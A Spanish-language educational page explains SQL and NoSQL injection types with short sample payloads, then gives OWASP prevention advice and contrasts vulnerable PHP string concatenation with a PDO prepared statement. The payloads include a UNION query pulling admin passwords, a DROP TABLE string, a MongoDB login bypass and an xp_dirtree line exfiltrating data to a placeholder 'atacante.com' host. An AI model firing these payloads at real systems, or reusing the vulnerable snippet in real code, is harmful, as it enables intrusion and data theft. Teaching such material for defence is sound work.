Tipos de Inyección SQL

Conoce las variantes más peligrosas y cómo operan sobre los sistemas de bases de datos.

CLÁSICA
In-Band SQLi

El atacante usa el mismo canal para lanzar el ataque y obtener resultados. Es la variante más común y fácil de explotar.

-- Error-Based
' AND 1=CONVERT(int,@@version)--

-- Union-Based
' UNION SELECT user,pass,3 FROM admin--
Error-Based Union-Based
CIEGA
Blind SQLi

No se muestra ningún error visible. El atacante infiere información según respuestas verdadero/falso o tiempos de respuesta.

-- Boolean-Based
' AND 1=1-- (TRUE)
' AND 1=2-- (FALSE)

-- Time-Based
'; WAITFOR DELAY '0:0:5'--
Boolean-Based Time-Based
AVANZADA
Out-of-Band SQLi

Usa canales alternativos (DNS, HTTP) para exfiltrar datos. Requiere funciones del servidor como xp_cmdshell o UTL_HTTP.

-- DNS Exfiltration (SQL Server)
'; exec master..xp_dirtree
'//atacante.com/'+@@version--
DNS HTTP
PERSISTENTE
Stored SQLi

El payload se almacena en la base de datos y se ejecuta cuando otros usuarios acceden al contenido contaminado.

-- Comentario malicioso guardado
Nombre: '; DROP TABLE users;--

-- Se ejecuta al recuperarlo
SELECT name FROM comments WHERE id=1
Persistente Multi-usuario
DIFERIDA
Second-Order SQLi

Los datos son almacenados de forma segura inicialmente, pero se usan sin sanitizar en una consulta posterior, activando el ataque con retraso.

-- Paso 1: Registro seguro
username = admin'--

-- Paso 2: Cambio de contraseña
UPDATE users SET pwd='X'
WHERE user='admin'--'
Diferida Compleja
MODERNA
NoSQL Injection

Variante que afecta bases de datos NoSQL como MongoDB. Usa operadores de consulta para bypassear autenticación sin usar SQL.

-- MongoDB payload
{"username": {"$gt":""},
"password": {"$gt":""}}

-- Siempre retorna TRUE
MongoDB Redis
Mitigación

Prevención de Inyecciones SQL

Técnicas efectivas recomendadas por OWASP para proteger tus aplicaciones

Buenas Prácticas

Prepared Statements

Separa código SQL de los datos usando parámetros. Método más efectivo contra SQLi.

ORM / Query Builders

Frameworks como Hibernate, SQLAlchemy o Eloquent gestionan el escape automáticamente.

Validación de Entradas

Whitelist de caracteres permitidos, validación de tipos y longitud máxima en cada campo.

Principio de Mínimo Privilegio

La cuenta de BD de la app solo debe tener los permisos estrictamente necesarios (sin DROP, ALTER).

VULNERABLE (PHP) 
// ❌ Concatenación directa - PELIGROSO
$user = $_POST['username'];
$sql = "SELECT * FROM users
         WHERE user='" . $user . "'";
$result = mysqli_query($conn, $sql);
vs
SEGURO - Prepared Statement (PHP PDO) 
// ✅ Prepared Statement - SEGURO
$user = $_POST['username'];
$stmt = $pdo->prepare(
  "SELECT * FROM users WHERE user = ?"
);
$stmt->execute([$user]);
$result = $stmt->fetchAll();
// Los parámetros NUNCA son ejecutados como código SQL
